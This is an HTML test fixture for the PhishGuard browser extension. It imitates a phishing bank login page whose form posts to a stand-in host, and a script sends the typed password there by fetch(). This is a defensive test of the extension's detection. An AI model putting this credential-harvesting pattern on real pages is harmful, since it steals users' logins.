<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Fake Bank Login (test page \u2014 not a real site)</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 360px; margin: 60px auto; }
    input { display: block; width: 100%; margin-bottom: 10px; padding: 8px; }
    button { padding: 8px 16px; }
    p.note { font-size: 12px; color: #888; }
  </style>
</head>
<body>
  <h2>Account Login</h2>

  <!-- This form intentionally submits to a different domain than the page
       it's served from, which is exactly the pattern PhishGuard should flag. -->
  <form id="login-form" action="https://credential-collector.example.com/harvest" method="POST">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Log in</button>
  </form>

  <button id="js-submit">Log in via JS (fetch)</button>

  <p class="note">
    This is a local test fixture for the PhishGuard extension, not a real
    login page or a real destination \u2014 the form action and fetch URL
    both point to a non-existent domain.
  </p>

  <script>
    // Simulates a phishing page that steals the password via a background
    // fetch() call instead of (or in addition to) a normal form submission.
    // This exercises inject.js's fetch hook.
    document.getElementById("js-submit").addEventListener("click", () => {
      const pw = document.querySelector('input[type="password"]').value || "testpassword123";
      fetch("https://credential-collector.example.com/harvest-js", {
        method: "POST",
        body: JSON.stringify({ password: pw }),
      }).catch(() => {
        /* the domain doesn't resolve \u2014 expected, we only care that
           PhishGuard intercepts the attempt before the request goes out */
      });
    });
  </script>
</body>
</html>
